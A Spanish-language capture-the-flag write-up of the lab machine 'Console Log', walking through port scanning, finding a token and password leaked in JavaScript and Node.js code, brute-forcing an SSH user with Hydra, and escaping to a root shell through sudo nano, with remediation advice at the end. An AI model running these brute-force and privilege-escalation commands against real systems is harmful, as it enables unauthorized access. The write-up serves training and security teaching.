# Writeup: Console Log - Red Team Report

**Autor:** Dani-kl
**Dificultad:** Fácil / Intermedia  
**Vectores de Ataque:** Fuga de información en código fuente (JavaScript), Directory Listing, Análisis de código Node.js, Fuerza bruta de usuarios de SSH (Hydra), Abuso de privilegios Sudo (Nano).

---

## 📌 Resumen Ejecutivo
El compromiso de la máquina "Console Log" comienza con una enumeración del servicio web, donde se descubre una mala configuración que expone comentarios de desarrollo y credenciales en texto claro a través de archivos `.js`. Posteriormente, se utiliza fuerza bruta para identificar un usuario válido de SSH. Finalmente, la escalada de privilegios se logra abusando de permisos `sudo` mal configurados en el editor de texto `nano`.

---

## 🛠️ Fase 1: Despliegue y Reconocimiento (Recon)

Comenzamos desplegando el laboratorio y preparando nuestro entorno:

```bash
sudo bash auto_deploy.sh consolelog.tar
```

### Escaneo de Puertos
Para tener una visión completa de la superficie de ataque, realizamos un escaneo de puertos agresivo utilizando `nmap`. Dividimos esto en dos fases para ser más rápidos: primero descubrimos los puertos abiertos y luego lanzamos scripts de enumeración.

```bash
# 1. Descubrimiento rápido de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

```text
Host is up (0.0000090s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
```

Una vez identificados los puertos, lanzamos un escaneo profundo para detectar servicios y versiones. *Nota: Aunque nmap reporta los puertos 3000 y 5000 como ppp y upnp por defecto, el escaneo de versiones nos revelará su verdadera naturaleza (un servicio web adicional y un SSH en puerto no estándar).*

```bash
# 2. Escaneo de servicios y versiones
nmap -sCV -p80,3000,5000 172.17.0.2 -oN targeted
```

---

## 🔎 Fase 2: Enumeración Web

Al acceder al puerto `80` a través de nuestro navegador, observamos una página sencilla sin mucha funcionalidad aparente. Como Red Teamers, nuestro primer instinto es revisar el código fuente (`Ctrl + U`).

```html
<!DOCTYPE html>
<html>
<head>
<title>Mi Sitio</title>
<script src="authentication.js"></script>
</head>
<body>
<h1>Bienvenido a Mi Sitio</h1>
<button onclick="autenticate()">Boton en fase beta</button>
</body>
</html>
```

Notamos la inclusión de un archivo `authentication.js`. Al analizar su contenido, encontramos una fuga de información crítica dejada por los desarrolladores:

```javascript
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Este comentario nos da un vector de ataque: existe un directorio o endpoint llamado `/recurso/` y un token asociado.

### Fuzzing de Directorios

Para descubrir rutas ocultas, utilizamos herramientas de fuzzing. Aunque se utilizó `dirb` en la auditoría inicial, recomiendo usar `ffuf` o `gobuster` por su velocidad y eficiencia en auditorías profesionales.

**Comando (Alternativa moderna):**
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.17.0.2/FUZZ -mc 200,301,403
```

**Resultado de la auditoría (DIRB):**
```text
---- Scanning URL: http://172.17.0.2/ ----
==> DIRECTORY: http://172.17.0.2/backend/
+ http://172.17.0.2/index.html (CODE:200|SIZE:234)
==> DIRECTORY: http://172.17.0.2/javascript/
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)

---- Entering directory: http://172.17.0.2/backend/ ----
(!) WARNING: Directory IS LISTABLE.
```

Descubrimos el directorio `/backend/`, el cual sufre de la vulnerabilidad **Directory Listing** (CWE-548), permitiéndonos ver todos los archivos contenidos.

---

## 💻 Fase 3: Explotación y Acceso Inicial

Navegamos a `http://172.17.0.2/backend/` y encontramos varios archivos, destacando `server.js`. Inspeccionamos el código fuente de este backend en Node.js:

```javascript
app.post('/recurso/', (req, res) => {
    const token = req.body.token;
    if (token === 'tokentraviesito') {
        res.send('lapassworddebackupmaschingonadetodas');
    } else {
        res.status(401).send('Unauthorized');
    }
});
```

Este código revela que si enviamos una petición POST con el token descubierto anteriormente, el servidor nos devuelve una contraseña: `lapassworddebackupmaschingonadetodas`.

### Ataque de Diccionario (SSH)

Tenemos una contraseña pero no un usuario. Sabiendo que el puerto 5000 está ejecutando SSH (como se intuye por la necesidad de autenticación), utilizaremos **Hydra** para realizar un ataque de fuerza bruta inverso (User Spraying), utilizando un diccionario de usuarios comunes (o `rockyou.txt` como diccionario de usuarios, dependiendo de la configuración) contra la contraseña que ya conocemos.

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p 'lapassworddebackupmaschingonadetodas' ssh://172.17.0.2:5000 -t 4 -V
```

*Explicación: `-L` indica la lista de posibles usuarios, `-p` indica la contraseña estática, `-t 4` baja los hilos para evitar bloqueos.*

El ataque es exitoso y nos revela el usuario `lovely`. Procedemos a conectarnos:

```bash
ssh lovely@172.17.0.2 -p 5000
```
```text
lovely@172.17.0.2's password: 
Linux 803768056c49 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
lovely@803768056c49:~$
```

---

## 🛡️ Fase 4: Escalada de Privilegios

Una vez que obtenemos acceso como usuario de bajos privilegios, la primera fase de enumeración local es revisar nuestros permisos en `sudo`.

```bash
sudo -l
```

```text
Matching Defaults entries for lovely on 8037bd056c49:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User lovely may run the following commands on 8037bd056c49:
    (ALL) NOPASSWD: /usr/bin/nano
```

Vemos que el usuario `lovely` puede ejecutar el editor `nano` como el usuario `root` (ALL) sin necesidad de proporcionar contraseña (`NOPASSWD`).

### Abuso de Sudo (GTFOBins)

Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) para buscar vectores de escape (shell escape) utilizando `nano`. 
El editor `nano` permite ejecutar comandos del sistema para leer salidas o procesar texto.

Ejecutamos el comando permitido:
```bash
sudo /usr/bin/nano
```

Una vez dentro de la interfaz de `nano`, realizamos la siguiente secuencia de teclas para ejecutar un comando en el sistema y obtener una shell interactiva como root:

1. Presionamos `Ctrl + R` (Read File).
2. Presionamos `Ctrl + X` (Execute Command).
3. Escribimos el siguiente comando y damos `Enter`:
   
```bash
   reset; sh 1>&0 2>&0
```

El editor se cerrará temporalmente y nos otorgará un shell directo con permisos de superusuario.

```bash
# Verificamos nuestra identidad
whoami
```

```text
root
```

**¡Máquina comprometida con éxito! 🚩**

---
## 💡 Recomendaciones de Remediación
1. **Evitar credenciales Hardcodeadas:** No dejar tokens ni contraseñas en el código fuente ni en comentarios de producción (`authentication.js`, `server.js`).
2. **Deshabilitar Directory Listing:** Configurar Apache/Nginx para evitar el listado de directorios y exponer archivos sensibles.
3. **Principio de Mínimo Privilegio (Sudo):** Eliminar el acceso de ejecución de binarios que permiten la ejecución de sub-comandos (`nano`, `vim`, `less`) con `sudo`. Si un usuario necesita editar un archivo protegido con root, se debe usar `sudoedit`.
